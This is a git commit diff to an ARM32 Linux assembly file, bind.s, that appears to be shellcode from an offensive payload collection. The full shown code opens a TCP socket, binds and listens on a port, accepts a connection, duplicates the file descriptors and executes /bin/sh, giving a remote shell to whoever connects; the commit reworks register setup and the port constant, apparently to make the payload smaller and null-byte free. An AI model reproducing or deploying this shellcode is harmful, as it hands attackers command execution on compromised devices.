eb4721e1118d79a974b1a537a46a1a3b842f98ab
root <root@raspberrypi>
2018-01-03 23:43:58 +0000

    upd

--- os/linux/arm32/bind.s
+++ os/linux/arm32/bind.s
@@ -11,6 +11,8 @@
 _start:
     // switch to thumb mode
     .code 32
+    ldr    r7, =#281
+    ldr    r4, =#0xD402FF02 
     add    r3, pc, #1
     bx     r3 
   
@@ -19,27 +21,27 @@ _start:
     eor    r2, r2, r2   // r2 = IPPROTO_IP
     mov    r1, #1       // r1 = SOCK_STREAM
     mov    r0, #2       // r0 = AF_INET
-    lsl    r7, r1, #8   // multiply by 256
-    add    r7, #25      // r7 = 256+25 = 281 = socket
     svc    1
     
     mov    r6, r0       // r6 = s
     
     // bind(s, &sa, sizeof(sa));  
-    mov    r2, #16      // r2 = sizeof(sa)
-    adr    r1, sin_port // r1 = sa.sin_port
-    mov    r1, sp   
+    //adr    r1, sa       // r1 = &sa
+    mov    r1, r4 
+    push   {r1, r2}
+    mov    r1, sp
+    strb   r2, [r1, #1] 
+    mov    r2, #16      // sizeof(sa) 
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
     // listen(s, 0);
-    eor    r1, r1, r1   // r1 = 0    
+    mov    r1, #1   // r1 = 0    
     mov    r0, r6
     add    r7, #2       // r7 = 282+2 = 284 = listen 
     svc    1    
     
     // r = accept(s, 0, 0);
-    //umull r1, r2, r0, r0
     eor    r2, r2, r2   // r2 = 0
     eor    r1, r1, r1   // r1 = 0
     mov    r0, r6       // r0 = s
@@ -60,15 +62,12 @@ dup_loop:
     bpl    dup_loop
 
     // execve("/bin/sh", NULL, NULL);    
-    //umull r1, r2, r0, r0    
     adr    r0, sh       // r0 = "/bin/sh" 
     eor    r2, r2, r2   // r2 = NULL
     eor    r1, r1, r1   // r1 = NULL
     strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
-sin_port:    
-    .word  0xd2040002
 sh:    
     .ascii "/bin/shX"
 
